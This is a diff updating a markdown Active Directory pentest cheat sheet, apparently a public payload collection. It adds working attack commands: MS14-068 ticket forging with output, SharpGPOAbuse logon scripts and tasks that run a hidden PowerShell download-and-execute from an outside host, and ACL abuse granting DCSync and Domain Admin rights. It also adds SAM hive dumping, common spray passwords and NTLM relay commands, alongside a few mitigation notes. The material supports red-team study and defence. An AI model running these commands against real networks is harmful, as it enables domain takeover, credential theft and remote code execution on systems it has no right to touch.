@@ -9,7 +9,8 @@
     - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
-    - [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
+    - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
+    - [Exploit Group Policy Objects GPO](#exploit-group-policy-objects-gpo)
     - [Dumping AD Domain Credentials](#dumping-ad-domain-credentials)
       - [Using ndtsutil](#using-ndtsutil)
       - [Using Vshadow](#using-vshadow)
@@ -44,15 +45,11 @@
       - [Drop the MIC](#drop-the-mic)
       - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
+    - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
-    - [Unconstrained delegation](#unconstrained-delegation)
-      - [Find delegation](#find-delegation)
-      - [Monitor with Rubeus](#monitor-with-rubeus)
-      - [Force a connect back from the DC](#force-a-connect-back-from-the-dc)
-      - [Load the ticket](#load-the-ticket)
-      - [Mitigation](#mitigation)
-    - [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
+    - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
+    - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
     - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
     - [PrivExchange attack](#privexchange-attack)
     - [PXE Boot image attack](#pxe-boot-image-attack)
@@ -80,6 +77,8 @@
   SharpHound.exe (from resources/Ingestor)
   SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
   SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
+  SharpHound.exe -c all -d active.htb -SearchForest
+  SharpHound.exe --EncryptZip --ZipFilename export.zip
   or 
   Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
   or 
@@ -115,6 +114,7 @@
   # -wh: Server hosting WPAD file (Attacker’s IP)
   # -t: Target (You cannot relay credentials to the same device that you’re spoofing)
   # -i: open an interactive shell
+  ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
   ```
 
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
@@ -214,11 +214,22 @@ Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
 ```
 
 ```powershell
-# https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
-git clone https://github.com/SecWiki/windows-kernel-exploits
-python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
-python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
-python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10
+# Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
+$ git clone https://github.com/SecWiki/windows-kernel-exploits
+$ python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
+$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
+$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10
+$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066
+-1105
+  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!
+  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!
+  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!
+  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!
+  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!
+  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!
+  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!
+  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!
+  [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!
 ```
 
 Then use `mimikatz` to load the ticket.
@@ -236,6 +247,11 @@ clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s
 Linux> sudo date -s "14 APR 2015 18:25:16" 
 Windows> net time /domain /set
 ```
+
+#### Mitigations
+
+* Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780
+
 
 ### Open Shares
 
@@ -317,11 +333,11 @@ IconIndex=1
 ```
 
 
-### GPO - Pivoting with Local Admin & Passwords in SYSVOL
+### Passwords in SYSVOL & Group Policy Preferences
 
 :triangular_flag_on_post: GPO Priorization : Organization Unit > Domain > Site > Local
 
-Find password in SYSVOL (MS14-025)
+Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.
 
 ```powershell
 findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
@@ -338,20 +354,22 @@ echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d
 echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
 ```
 
-Metasploit modules to enumerate shares and credentials
+#### Automate the SYSVOL and passwords research
 
-```c
-scanner/smb/smb_enumshares
-post/windows/gather/enum_shares
-post/windows/gather/credentials/gpp
-```
+* Metasploit modules to enumerate shares and credentials
 
-Crackmapexec modules
+    ```c
+    scanner/smb/smb_enumshares
+    post/windows/gather/enum_shares
+    post/windows/gather/credentials/gpp
+    ```
 
-```powershell
-cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_autologin
-cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_password
-```
+* Crackmapexec modules
+
+    ```powershell
+    cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_autologin
+    cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_password
+    ```
 
 List all GPO for a domain
 
@@ -363,6 +381,29 @@ Powersploit:
 Get-NetGPO
 Get-NetGPOGroup
 ```
+
+#### Mitigations
+
+* Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.
+* Delete existing GPP xml files in SYSVOL containing passwords.
+* Don’t put passwords in files that are accessible by all authenticated users.
+
+### Exploit Group Policy Objects GPO
+
+```powershell
+# Adding User Rights
+SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
+
+# Adding a Local Admin
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
+
+# Configuring a User or Computer Logon Script
+SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+
+# Configuring a Computer or User Immediate Task
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+```
+
 
 ### Dumping AD Domain Credentials
 
@@ -448,9 +489,12 @@ secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 secretsdump also works remotely
 
 ```java
-./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss
+./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
 ./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
 ```
+
+* `-pwd-last-set`: Shows pwdLastSet attribute for each NTDS.DIT account.
+* `-user-status`: Display whether or not the user is disabled.
 
 #### Alternatives - modules
 
@@ -502,10 +546,10 @@ Password spraying refers to the attack method that takes a large number of usern
 
 Most of the time the best passwords to spray are :
 
-- Password123
-- Welcome1
+- P@ssw0rd01, Password123, mimikatz
+- Welcome1/Welcome01
 - $Companyname1 : $Microsoft1
-- SeasonYear : Winter2019*
+- SeasonYear : Winter2019*,Spring2020!,Summer2018? 
 - Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)
 
 #### Kerberos pre-auth bruteforcing
@@ -679,7 +723,7 @@ hashcat -m 13100 -a 0 hash.txt crackstation.txt
 ```
 
 Mitigations: 
-* Have a very long password for your accounts with SPNs
+* Have a very long password for your accounts with SPNs (> 25 characters)
 * Make sure no users have SPNs
 
 ### KRB_AS_REP Roasting
@@ -767,6 +811,16 @@ or with the builtin Windows RDP and mimikatz
 ```powershell
 sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
 ```
+
+You can extract the local SAM database to find the local administrator hash :
+
+```powershell
+C:\> reg.exe save hklm\sam c:\temp\sam.save
+C:\> reg.exe save hklm\security c:\temp\security.save
+C:\> reg.exe save hklm\system c:\temp\system.save
+$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
 
 ### OverPass-the-Hash (pass the key)
 
@@ -888,9 +942,9 @@ cme smb $hosts --gen-relay-list relay.txt
 mitm6 -i eth0 -d $domain
 
 # spoofing WPAD and relaying NTLM credentials
-http://ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
+ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
 or 
-http://ntlmrelayx.py -6 -wh $attacker_ip -l /tmp -socks -debug
+ntlmrelayx.py -6 -wh $attacker_ip -l /tmp -socks -debug
 ```
 
 #### Drop the MIC
@@ -940,7 +994,7 @@ ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 
 ### Dangerous Built-in Groups Usage
 
-If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object CN=AdminSDHolder,CN=System, " or set "adminCount" attribute to 0 for the required objec
+If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object "CN=AdminSDHolder,CN=System," or set "adminCount" attribute to 0 for the required objec
 
 AdminSDHolder
 
@@ -951,7 +1005,50 @@ or
 ([adsisearcher]"(AdminCount=1)").findall()
 ```
 
+#### AdminSDHolder Abuse
+if you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by SDProp
+
+```powershell
+# right to reset password for toto using the account titi
+Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword
+# give all rights
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
+```
+
+
+### Abusing Active Directory ACLs/ACEs
+
+* **GenericAll on User** : We can reset user's password without knowing the current password
+* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : `net group "domain admins" spotless /add /domain`
+* **WriteProperty on Group** : We can again add ourselves to the Domain Admins group and escalate privileges: `net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain`
+* **Self (Self-Membership) on Group** : Another privilege that enables the attacker adding themselves to a group
+* **ForceChangePassword** : we can reset the user's password without knowing their current password: `$c = Get-Credential;Set-DomainUserPassword -Identity changeme -AccountPassword $c.Password -Verbose` 
+* **GenericWrite on User** : WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
+* **WriteDACL** : It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'`
+    ```powershell
+    # give DCSync right to titi
+    Add-ObjectACL -TargetDistinguishedName "dc=dev,dc=testlab,dc=local" -PrincipalSamAccountName titi -Rights DCSync
+    ```
+
+Check ACL for an User with [ADACLScanner](https://github.com/canix1/ADACLScanner).
+
+```powershell
+ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
+```
+
+
 ### Trust relationship between domains
+
+* One-way
+  * Domain B trusts A
+  * Users in Domain A can access resources in Domain B
+  * Users in Domain B cannot access resources in Domain A
+* Two-way
+  * Domain A trusts Domain B
+  * Domain B trusts Domain A
+  * Authentication requests can be passed between the two domains in both directions
+
+#### Enumerate trusts between domains
 
 ```powershell
 nltest /trusted_domains
@@ -966,6 +1063,19 @@ SourceName          TargetName                    TrustType      TrustDirection
 ----------          ----------                    ---------      --------------
 domainA.local      domainB.local                  TreeRoot       Bidirectional
 ```
+
+#### Exploit trusts between domains
+
+:warning: Require a Domain-Admin level access to the current domain.
+
+| Source     | Target  | Technique to use  | Trust relationship  |
+|---|---|---|---|
+| Root      | Child  | Golden Ticket + Enterprise Admin group (Mimikatz /groups) | Inter Realm (2-way)  |
+| Child     | Child  | SID History exploitation (Mimikatz /sids)                 | Inter Realm Parent-Child (2-way)  |
+| Child     | Root   | SID History exploitation (Mimikatz /sids)                 | Inter Realm Tree-Root (2-way)  |
+| Forest A  | Forest B  | PrinterBug + Unconstrained delegation ?  | Inter Realm Forest or External (2-way)  |
+
+
 
 ### Child Domain to Forest Compromise - SID Hijacking
 
@@ -986,9 +1096,16 @@ Prerequisite:
     kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
     ```
 
-### Unconstrained delegation
+### Kerberos Unconstrained Delegation
 
 > The user sends a TGS to access the service, along with their TGT, and then the service can use the user’s TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+
+Domain Compromise via DC Print Server and Unconstrained Delegation
+
+Prerequisites:
+- Object with Property "Trust this computer for delegation to any service (Kerberos only)"
+- Must have ADS_UF_TRUSTED_FOR_DELEGATION 
+- Must not have ADS_UF_NOT_DELEGATED flag
 
 #### Find delegation
 
@@ -1036,7 +1153,9 @@ Extract the base64 TGT from Rubeus output and load it to our current session.
 .\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
 ```
 
-Then you can use DCsync or another attack : `Mimikatz> lsadump::dcsync /user:HACKER\krbtgt`
+Alternatively you could also grab the ticket using Mimikatz :  `mimikatz # sekurlsa::tickets`
+
+Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HACKER\krbtgt`
 
 
 #### Mitigation
@@ -1044,7 +1163,7 @@ Then you can use DCsync or another attack : `Mimikatz> lsadump::dcsync /user:HAC
 * Ensure sensitive accounts cannot be delegated
 * Disable the Print Spooler Service
 
-### Resource-Based Constrained Delegation
+### Kerberos Resource Based Constrained Delegation
 
 Resource-based Constrained Delegation was introduced in Windows Server 2012. 
 
@@ -1408,3 +1527,6 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
 * [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https:/www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
 * [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
+* [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+* [A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
+* [Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf](https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0)
